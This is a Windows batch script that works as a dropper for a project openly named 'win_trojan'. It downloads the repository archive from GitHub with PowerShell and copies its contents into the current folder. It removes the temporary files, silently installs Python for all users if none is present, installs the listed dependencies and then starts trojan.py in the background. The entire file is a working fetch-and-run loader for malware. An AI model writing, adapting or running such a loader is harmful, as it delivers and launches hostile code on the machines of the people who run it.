@echo off
SETLOCAL EnableDelayedExpansion

:: --- Configuration ---
SET "REPO_URL=https://github.com/Noah-school/win_trojan/archive/refs/heads/main.zip"
SET "ZIP_FILE=win_trojan.zip"
SET "TEMP_EXTRACT=%TEMP%\win_trojan_temp"
SET "PYTHON_EXE=python"

echo [*] Target Directory: %~dp0
cd /d "%~dp0"

:: 1. Download the repository
echo [*] Downloading files...
powershell -Command "Invoke-WebRequest -Uri '%REPO_URL%' -OutFile '%ZIP_FILE%'"
if %ERRORLEVEL% neq 0 (
    echo [!] Download failed.
    pause
    exit /b
)

:: 2. Extract and Flatten Structure
echo [*] Extracting files directly to this folder...
if exist "%TEMP_EXTRACT%" rd /S /Q "%TEMP_EXTRACT%"
powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%TEMP_EXTRACT%' -Force"

:: Move contents from the subfolder to the current directory
xcopy "%TEMP_EXTRACT%\win_trojan-main\*" "." /E /H /Y /Q

:: 3. Cleanup
echo [*] Cleaning up temporary data...
rd /S /Q "%TEMP_EXTRACT%"
del "%ZIP_FILE%"

:: 4. Python Check and Install
%PYTHON_EXE% --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [!] Python not found. Installing...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe' -OutFile 'py_inst.exe'"
    start /wait py_inst.exe /quiet InstallAllUsers=1 PrependPath=1
    del py_inst.exe
    :: Update path for current session
    SET "PATH=%PATH%;%ProgramFiles%\Python311\;%ProgramFiles%\Python311\Scripts\"
)

:: 5. Install Dependencies
if exist "requirements.txt" (
    echo [*] Installing requirements...
    %PYTHON_EXE% -m pip install -r requirements.txt
)

:: 6. Run the Script
if exist "trojan.py" (
    echo [*] Success. Launching trojan.py...
    start "" %PYTHON_EXE% trojan.py
) else (
    echo [!] Error: trojan.py was not found in this folder.
)

exit
